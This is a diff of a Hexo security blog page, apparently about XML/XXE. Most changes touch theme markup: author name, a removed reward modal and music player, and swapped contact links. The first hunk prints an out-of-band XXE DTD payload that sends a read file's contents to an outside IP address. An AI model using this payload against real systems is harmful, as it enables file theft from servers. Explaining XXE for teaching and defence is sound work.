-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#1.xml</span><br><span class="line">&lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://20.231.29.154/1.php?1=%file;&#x27;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">&amp;all;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">#1.xml
+&lt;!ENTITY % all
+&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;20.231.29.154&#x2F;1.php?1&#x3D;%file;&#39;&gt;&quot;
+&gt;
+&amp;all;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">
                 
@@ -478,7 +471,7 @@ XML用于标记电子文件使其具有结构性的标记语言，可以用来�
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">Jlan</a>
+                    <a href="/about" rel="external nofollow noreferrer">J1an</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -501,7 +494,7 @@ XML用于标记电子文件使其具有结构性的标记语言，可以用来�
                     本博客所有文章除特別声明外，均采用
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     许可协议。转载请注明来源
-                    <a href="/about" target="_blank">Jlan</a>
+                    <a href="/about" target="_blank">J1an</a>
                     !
                 </span>
             </div>
@@ -553,39 +546,6 @@ XML用于标记电子文件使其具有结构性的标记语言，可以用来�
                 </div>
             </div>
             
-                <div id="reward">
-    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
-
-    <!-- Modal Structure -->
-    <div id="rewardModal" class="modal">
-        <div class="modal-content">
-            <a class="close modal-close"><i class="fas fa-times"></i></a>
-            <h4 class="reward-title">你的赏识是我前进的动力</h4>
-            <div class="reward-content">
-                <div class="reward-tabs">
-                    <ul class="tabs row">
-                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
-                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
-                    </ul>
-                    <div id="alipay">
-                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
-                    </div>
-                    <div id="wechat">
-                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-</div>
-
-<script>
-    $(function () {
-        $('.tabs').tabs();
-    });
-</script>
-
-            
         </div>
     </div>
 
@@ -636,7 +596,7 @@ XML用于标记电子文件使其具有结构性的标记语言，可以用来�
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            Jlan
+                            J1an
                             
                         </span>
                     </div>
@@ -685,7 +645,7 @@ XML用于标记电子文件使其具有结构性的标记语言，可以用来�
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            Jlan
+                            J1an
                             
                         </span>
                     </div>
@@ -716,6 +676,9 @@ XML用于标记电子文件使其具有结构性的标记语言，可以用来�
 <!-- 代码块功能依赖 -->
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
 
 
 <!-- 代码语言 -->
@@ -824,69 +787,15 @@ XML用于标记电子文件使其具有结构性的标记语言，可以用来�
 
     <footer class="page-footer bg-color">
     
-        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
-<style>
-    .aplayer .aplayer-lrc p {
-        
-        display: none;
-        
-        font-size: 12px;
-        font-weight: 700;
-        line-height: 16px !important;
-    }
-
-    .aplayer .aplayer-lrc p.aplayer-lrc-current {
-        
-        display: none;
-        
-        font-size: 15px;
-        color: #42b983;
-    }
-
-    
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
-        left: -66px !important;
-    }
-
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
-        left: 0px !important;
-    }
-
-    
-</style>
-<div class="">
-    
-    <div class="row">
-        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
-                   server="netease"
-                   type="playlist"
-                   id="503838841"
-                   fixed='true'
-                   autoplay='false'
-                   theme='#42b983'
-                   loop='all'
-                   order='random'
-                   preload='auto'
-                   volume='0.7'
-                   list-folded='true'
-        >
-        </meting-js>
-    </div>
-</div>
-
-<script src="/libs/aplayer/APlayer.min.js"></script>
-<script src="/libs/aplayer/Meting.min.js"></script>
-
-    
 
     <div class="container row center-align"
          style="margin-bottom: 0px !important;">
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
             
-                <span id="year">2019-2022</span>
+                <span id="year">2022</span>
             
-            <a href="/about" target="_blank">Jlan</a>
+            <a href="/about" target="_blank">J1an</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             <br>
@@ -921,7 +830,7 @@ XML用于标记电子文件使其具有结构性的标记语言，可以用来�
 
 
 
-    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <a href="mailto:jlan@icloud.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
         <i class="fas fa-envelope-open"></i>
     </a>
 
@@ -929,10 +838,8 @@ XML用于标记电子文件使其具有结构性的标记语言，可以用来�
 
 
 
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
-        <i class="fab fa-qq"></i>
+    <a href="https://twitter.com/J1an45" class="tooltipped" target="_blank" data-tooltip="关注我的Twitter: https://twitter.com/J1an45" data-position="top" data-delay="50">
+        <i class="fab fa-twitter"></i>
     </a>
 
 
@@ -941,9 +848,7 @@ XML用于标记电子文件使其具有结构性的标记语言，可以用来�
 
 
 
-    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
-        <i class="fas fa-rss"></i>
-    </a>
+
 
 </div>
     </div>
@@ -1103,6 +1008,14 @@ $(function () {
     
 
     <!-- 鼠标星星特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
+            }
+        </script>
     
 
      
@@ -1129,8 +1042,6 @@ $(function () {
     })();
 </script>
 
-    
-    <script src="/libs/others/clicklove.js" async="async"></script>
     
     
     <script async src="/libs/others/busuanzi.pure.mini.js"></script>
